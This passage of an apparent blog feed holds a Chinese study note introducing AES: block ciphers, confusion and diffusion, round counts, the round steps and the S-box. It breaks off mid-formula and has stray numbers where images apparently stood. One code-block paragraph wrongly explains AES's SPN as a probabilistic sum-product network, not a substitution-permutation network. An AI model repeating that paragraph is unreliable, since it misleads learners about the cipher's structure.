            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识AES</title>
      <link href="/2024/04/29/%E5%88%9D%E8%AF%86AES/"/>
      <url>/2024/04/29/%E5%88%9D%E8%AF%86AES/</url>
      
        <content type="html"><![CDATA[<h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://ctf-wiki.org/crypto/blockcipher/aes/">AES - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">https://en.wikipedia.org/wiki/Advanced_Encryption_Standard</a></p><p><a href="https://en.wikipedia.org/wiki/Rijndael_S-box#Example_implementation_in_C_language">Rijndael S-box - Wikipedia</a></p><p>仅用作学习记录，归纳总结</p><h1 id="块加密"><a class="markdownIt-Anchor" href="#块加密"></a> 块加密</h1><h2 id="块密码分组密码"><a class="markdownIt-Anchor" href="#块密码分组密码"></a> 块密码/分组密码</h2><p>常见的块加密算法有</p><ul><li>IDEA加密</li><li>DES加密</li><li>AES加密</li></ul><p>块加密是对称密钥算法，将明文分为多个等长的模块（block）</p><p>然后使用确定的算法和对称密钥对每组分别加密解密</p><p>分组加密包含两个成对的算法：加密算法<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span>和解密算法<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>,两者互为反函数。每个算法有两个输入：长度为<code>n</code>位的组，和长度为<code>k</code>位的密钥；两组输入均生成<code>n</code>位输出。将两个算法看做函数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>表示长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>的密钥（密钥长度），<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>表示长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>的分组,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>也被飘逝为明文，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>表示密文，</p><p>则满足：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>E</mi><mi>K</mi></msub><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><mi>C</mi><mtext>  </mtext><mo separator="true">;</mo><mspace width="1em"/><msubsup><mi>E</mi><mi>K</mi><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mo stretchy="false">(</mo><mi>C</mi><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">E_K(P) = C \; ; \quad E_K^{-1}(C)=P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.14777em;vertical-align:-0.28366199999999997em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mpunct">;</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.416338em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.28366199999999997em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>E</mi><mi>K</mi></msub><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo>:</mo><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><mi>K</mi><mo separator="true">,</mo><mi>P</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>k</mi></msup><mo>×</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>n</mi></msup><mo>→</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>n</mi></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">E_K(P) := E(K,P): \{0,1\}^k \times \{0,1\}^n \rightarrow \{0,1\}^n,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></span></p><p>对于任意密钥 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>K</mi></msub><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_K(P)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span>是输入的组的一个置换函数，且可逆地落在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow><mn>0</mn><mo separator="true">,</mo><mn>1</mn></mrow><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">{0,1}^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8931720000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.698732em;"><span style="top:-3.09734em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>区间。E的反函数（解密算法）定义为：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>E</mi><mi>K</mi><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mo stretchy="false">(</mo><mi>C</mi><mo stretchy="false">)</mo><mo>:</mo><mo>=</mo><msub><mi>D</mi><mi>K</mi></msub><mo stretchy="false">(</mo><mi>C</mi><mo stretchy="false">)</mo><mo>=</mo><mi>D</mi><mo stretchy="false">(</mo><mi>K</mi><mo separator="true">,</mo><mi>C</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>k</mi></msup><mo>×</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>n</mi></msup><mo>→</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>n</mi></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">E_K^{-1}(C) := D_K(C) = D(K,C): \{0,1\}^k \times \{0,1\}^n \rightarrow \{0,1\}^n,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.14777em;vertical-align:-0.28366199999999997em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.416338em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.28366199999999997em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></span></p><p>所谓加密解密，就是由密钥生成的box进行替换，每次替换就是替换的一个block，比如一个分组加密算法使用一段 128 位的分组作为明文，相应输出 128 位的密文；而其转换则受加密算法中第二个输入的控制，也就是密钥 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>。解密算法类似，使用 128 位的密文和对应的密钥，得到原 128 位的明文</p><p>明文可能会很长，也可能会很短，因此块加密需要两个东西</p><ul><li>padding，即padding到制定分组长度</li><li>分组加密模式，即明文分组加密的方式</li></ul><h2 id="基本策略"><a class="markdownIt-Anchor" href="#基本策略"></a> 基本策略</h2><p>在分组密码设计时，充分使用了 Shannon 提出的两大策略：混淆与扩散两大策略。</p><h3 id="混淆"><a class="markdownIt-Anchor" href="#混淆"></a> 混淆</h3><p>混淆，Confusion，将密文与密钥之间的统计关系变得尽可能复杂，使得攻击者即使获取了密文的一些统计特性，也无法推测密钥。一般使用复杂的非线性变换可以得到很好的混淆效果，常见的方法如下</p><ul><li>S 盒</li><li>乘法</li></ul><h3 id="扩散"><a class="markdownIt-Anchor" href="#扩散"></a> 扩散</h3><p>扩散，Diffusion，使得明文中的每一位影响密文中的许多位。常见的方法有</p><ul><li>线性变换</li><li>置换</li><li>移位，循环移位</li></ul><h3 id="迭代结构"><a class="markdownIt-Anchor" href="#迭代结构"></a> 迭代结构</h3><ul><li><p>迭代结构</p><ul><li>密钥置换</li><li>轮加密函数</li><li>轮解密函数</li></ul></li></ul><p>1338</p><ul><li><p>轮函数</p><p>Feistel Network，由 Horst Feistel 发明，DES 设计者之一。</p><ul><li>DES</li></ul><p>Substitution-Permutation Network(SPN)</p><ul><li>AES</li></ul><p>其他方案</p></li><li><p>密钥拓展</p></li></ul><p>​基本原则是使得密钥的每一个比特尽可能影响多轮的轮密钥。</p><h1 id="aes"><a class="markdownIt-Anchor" href="#aes"></a> AES</h1><h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2><p>Advanced Encryption Standard（AES），高级加密标准，是典型的块加密,其基本信息如下</p><ul><li>输入：128 比特。</li><li>输出：128 比特。</li><li>SPN 网络结构</li></ul><p><code>SPN网络由节点和边组成，其中节点表示随机变量或者函数，边表示它们之间的依赖关系。SPN具有两种类型的节点：sum节点和product节点。sum节点表示一组随机变量的加权和，而product节点表示一组随机变量的乘积。SPN的计算具有递归结构，从底层的随机变量开始，通过递归地应用sum和product节点来计算整个网络的值。这种结构使得SPN在进行概率推断时能够高效地计算联合概率分布的边缘化和条件概率。</code></p><p>其迭代轮数与密钥长度有关系，如下</p><table><thead><tr><th style="text-align:center">密钥长度（比特）</th><th style="text-align:center">迭代轮数</th></tr></thead><tbody><tr><td style="text-align:center">128</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">192</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">256</td><td style="text-align:center">14</td></tr></tbody></table><h2 id="基本流程"><a class="markdownIt-Anchor" href="#基本流程"></a> 基本流程</h2><h3 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h3><p>2086</p><p>在 AES 中，块与 State 之间的转换过程如下</p><p>2184</p><p>每一个 block 中的字节是按照列排列进入到状态数组的</p><p>对于明文来说，一般我们会选择使用其十六进制进行编码。</p><p>2299</p><h3 id="加解密流程"><a class="markdownIt-Anchor" href="#加解密流程"></a> 加解密流程</h3><h4 id="总体"><a class="markdownIt-Anchor" href="#总体"></a> 总体</h4><p>2394AES加密过程是在一个4×4的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个Byte）。（Rijndael加密法因支持更大的区块，其矩阵的“列数（Row number）”可视情况增加）加密时，各轮AES加密循环（除最后一轮外)均包含4个步骤：</p><ol><li><strong>AddRoundKey</strong> 矩阵中的每一个字节都与该次回合密钥（round key）做XOR运算；每个子密钥由密钥生成方案产生。</li><li><strong>SubBytes</strong> 透过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。</li><li><strong>ShiftRows</strong> 将矩阵中的每个横列进行循环式移位。</li><li><strong>MixColumns</strong> 为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略MixColumns步骤，而以另一个AddRoundKey取代。</li></ol><p>以128bits，迭代10次为例,以下为每一轮所需的操作，我们把第一轮、最后一轮称为“初始轮”、“最终轮”，可以发现，它们只是“中间轮”的简化版：</p><ul><li>初始轮（1）<ul><li>AddRoundKey</li></ul></li><li>中间轮（2~9）<ul><li>SubBytes：将数据块中的数据，映射到 <a href="https://en.wikipedia.org/wiki/Rijndael_S-box">Rijndael S-box</a>，主要为了消除特征</li><li>ShiftRows：将数据块按“行”移位，以达到混淆的目的</li><li>MixColumns：将数据块按“列”与一个由多项式构成的 matrix，做矩阵乘法。目的是将单个错误扩散到整体，从而达到<a href="https://en.wikipedia.org/wiki/Avalanche_effect">雪崩效应</a>的预期，使其更难被破解</li><li>AddRoundKey：将本轮的 <code>key</code> 与数据块相加，由于使用 <a href="https://en.wikipedia.org/wiki/Finite_field">Galois field</a>，在代码中只是一个简单的 XOR</li></ul></li><li>最终轮（10）<ul><li>SubBytes</li><li>ShiftRows</li><li>AddRoundKey</li></ul></li></ul><h4 id="sbox"><a class="markdownIt-Anchor" href="#sbox"></a> Sbox</h4><h5 id="sbox-2"><a class="markdownIt-Anchor" href="#sbox-2"></a> SBox</h5><p>3444</p><p>其实<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">[</mo><msub><mi>s</mi><mn>7</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">s[s_7,...,s_0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>对应sbox的输出</p><p>要得出s要经过两个步骤</p><ul><li>求出输入 <em>c</em> over <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">GF(2^8)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">GF(2[x]/(x^8+x^4+x^3+x+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord">2</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span 